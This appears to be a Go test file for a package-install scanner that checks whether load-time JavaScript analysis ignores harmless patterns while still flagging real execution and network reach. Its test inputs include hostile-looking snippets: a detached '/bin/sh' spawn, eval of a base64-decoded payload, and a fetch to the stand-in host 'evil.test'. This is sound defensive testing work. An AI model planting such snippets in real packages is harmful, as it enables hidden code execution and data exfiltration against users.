package installsurface

import "testing"

// Regression for the meshclaw live-fire: the load-time analysis reused scanCaps'
// shell / multi-language exec + network markers, which over-fire on ordinary
// bundled JS — a template literal (`), a regex `.exec(`, a `.fetch(` method, a
// `String.fromCharCode` encoder, a JS bitwise `&` (matched as a PowerShell call
// operator). None of these is a load-time execution surface; none may produce a
// hook.
func TestLoadTimeIgnoresJSFalsePositives(t *testing.T) {
	cases := map[string]string{
		"regex .exec()":        "const re = /\\d+/g;\nexport const first = (s) => re.exec(s);",
		"template literal":     "export const greet = (x) => `hello ${x}!`;",
		"method fetch":         "export class Cache { get(k){ return this.store.fetch(k); } }",
		"fromCharCode encode":  "export const dec = (a) => String.fromCharCode.apply(null, a);",
		"js bitwise & (ps-op)": "export const mask = (x) => x & 0xff;\nconst tag = ns & \":\";",
	}
	for name, src := range cases {
		s := AnalyzeLoadTime("dist/index.mjs", src, func(string) ([]byte, bool) { return nil, false })
		if len(s.Hooks) != 0 {
			var caps []Capability
			if len(s.Hooks) > 0 {
				caps = s.Hooks[0].Caps
			}
			t.Errorf("%s: expected NO load-time hook, got %d (caps=%v)", name, len(s.Hooks), caps)
		}
	}
}

// The gate must still fire on a GENUINE load-time execution surface, or the fix
// would trade false positives for false negatives.
func TestLoadTimeStillFiresOnRealExec(t *testing.T) {
	cases := map[string]string{
		"child_process": "import { spawn } from 'node:child_process';\nspawn('/bin/sh', { detached: true });",
		"eval":          "const b = 'payload';\neval(atob(b));",
		"new Function":  "const f = new Function('x', 'return x');\nf(1);",
	}
	for name, src := range cases {
		s := AnalyzeLoadTime("dist/index.mjs", src, func(string) ([]byte, bool) { return nil, false })
		if len(s.Hooks) != 1 {
			t.Fatalf("%s: want 1 load-time hook, got %d", name, len(s.Hooks))
		}
		if !s.Hooks[0].HasCap(CapExec) {
			t.Errorf("%s: real load-time exec must register CapExec", name)
		}
	}
}

// A real loader that also calls a method named fetch must NOT be reported as
// reaching the network (lru-cache's cache.fetch()); a real loader with a bare
// global fetch or a URL must.
func TestLoadTimeMethodFetchNotNetwork(t *testing.T) {
	methodFetch := "import { spawn } from 'node:child_process';\nexport function run(c){ return c.cache.fetch('k'); }\nspawn('x');"
	s := AnalyzeLoadTime("dist/index.mjs", methodFetch, func(string) ([]byte, bool) { return nil, false })
	if len(s.Hooks) != 1 {
		t.Fatalf("want 1 hook (real exec present), got %d", len(s.Hooks))
	}
	if s.Hooks[0].HasCap(CapNetwork) {
		t.Error("a .fetch() method call must not be counted as network reach")
	}

	realNet := "import { spawn } from 'node:child_process';\nspawn('x');\nfetch('https://evil.test/p');"
	s2 := AnalyzeLoadTime("dist/index.mjs", realNet, func(string) ([]byte, bool) { return nil, false })
	if len(s2.Hooks) != 1 || !s2.Hooks[0].HasCap(CapNetwork) {
		t.Errorf("a bare fetch(url) at load must register CapNetwork, hooks=%d", len(s2.Hooks))
	}
}
